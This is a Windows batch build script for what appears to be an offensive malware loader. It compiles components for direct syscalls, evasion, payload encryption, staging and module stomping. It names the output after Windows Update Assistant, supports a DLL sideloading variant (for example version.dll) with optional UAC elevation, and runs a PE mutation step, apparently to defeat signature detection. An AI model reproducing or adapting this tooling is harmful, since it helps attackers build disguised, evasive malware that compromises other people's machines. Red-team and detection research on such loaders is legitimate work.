@echo off
REM =============================================
REM  build.bat
REM
REM  Usage: build.bat                           (EXE loader)
REM         build.bat uac                       (EXE with UAC manifest)
REM         build.bat sideload                  (DLL sideload variant)
REM         build.bat sideload version.dll      (custom output name)
REM         build.bat sideload uac              (DLL with self-elevation)
REM         build.bat sideload version.dll uac  (custom name + elevation)
REM =============================================

SET "VSTOOLS="
IF EXIST "C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat" (
    SET "VSTOOLS=C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat"
)
IF EXIST "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat" (
    SET "VSTOOLS=C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
)
IF "%VSTOOLS%"=="" ( echo [!] VS not found. & exit /b 1 )
call "%VSTOOLS%" >nul 2>&1

REM --- Parse "uac" flag from any position ---
SET UAC=0
IF "%1"=="uac" SET UAC=1
IF "%2"=="uac" SET UAC=1
IF "%3"=="uac" SET UAC=1

REM --- Validate sideload prerequisites ---
IF "%1"=="sideload" IF NOT EXIST Sideload.h (
    echo [!] Sideload.h not found. Run: python SideloadGen.py ^<target.dll^>
    exit /b 1
)

REM --- Default: EXE build ---
SET OUTNAME=WUAssistant.exe
SET CFILES=main.c Syscalls.c WinApi.c Evasion.c Crypt.c Staging.c Stomper.c
SET CFLAGS=/O1 /GS- /W0 /std:c17 /nologo
SET LFLAGS=/NODEFAULTLIB /ENTRY:Main /SUBSYSTEM:WINDOWS kernel32.lib user32.lib

REM --- Optional extra flags from the web UI or caller (e.g. /DDEBUG) ---
IF DEFINED CFLAGS_EXTRA SET CFLAGS=%CFLAGS% %CFLAGS_EXTRA%

REM --- EXE UAC: embed requireAdministrator manifest ---
IF NOT "%1"=="sideload" IF %UAC%==1 SET LFLAGS=/NODEFAULTLIB /ENTRY:Main /SUBSYSTEM:WINDOWS /MANIFEST:EMBED /MANIFESTUAC:"level='requireAdministrator' uiAccess='false'" kernel32.lib user32.lib
IF NOT "%1"=="sideload" IF %UAC%==1 echo [*] UAC manifest enabled

REM --- Override for sideload DLL build ---
IF "%1"=="sideload" (
    SET OUTNAME=sideload.dll
    SET CFILES=main.c Sideload.c Syscalls.c WinApi.c Evasion.c Crypt.c Staging.c Stomper.c
    SET "CFLAGS=/O1 /GS- /W0 /std:c17 /nologo /DBUILD_DLL"
    SET "LFLAGS=/DLL /NODEFAULTLIB /ENTRY:DllMain /SUBSYSTEM:WINDOWS kernel32.lib user32.lib"
    echo [*] Building DLL sideload variant...
)

REM --- DLL UAC: compile with REQUIRE_ELEVATION ---
IF "%1"=="sideload" IF %UAC%==1 SET "CFLAGS=/O1 /GS- /W0 /std:c17 /nologo /DBUILD_DLL /DREQUIRE_ELEVATION"
IF "%1"=="sideload" IF %UAC%==1 echo [*] UAC self-elevation enabled

REM --- Override output name (skip "uac" token) ---
IF "%1"=="sideload" IF NOT "%2"=="" IF NOT "%2"=="uac" SET "OUTNAME=%2"
IF "%1"=="sideload" IF "%2"=="uac" IF NOT "%3"=="" SET "OUTNAME=%3"

REM --- Compile version info resource (sideload only) ---
SET RESFILE=
IF "%1"=="sideload" IF EXIST Sideload.rc (
    echo [*] Compiling version info...
    rc /nologo Sideload.rc >nul
    IF %ERRORLEVEL% NEQ 0 ( echo [!] Resource compile failed & exit /b 1 )
    SET RESFILE=Sideload.res
)

echo [*] Assembling...
ml64 /c /nologo AsmStub.asm >nul
IF %ERRORLEVEL% NEQ 0 ( echo [!] ASM failed & exit /b 1 )

echo [*] Compiling...
cl %CFLAGS% %CFILES% AsmStub.obj %RESFILE% /Fe:%OUTNAME% /link %LFLAGS%
IF %ERRORLEVEL% NEQ 0 ( echo [!] Build failed & exit /b 1 )

echo [*] Mutating PE...
python Mutate.py %OUTNAME%

echo.
echo [+] Build: %OUTNAME%
for %%A in (%OUTNAME%) do echo [*] Size: %%~zA bytes
del /Q *.obj *.exp *.lib *.res 2>nul
echo [+] Done!
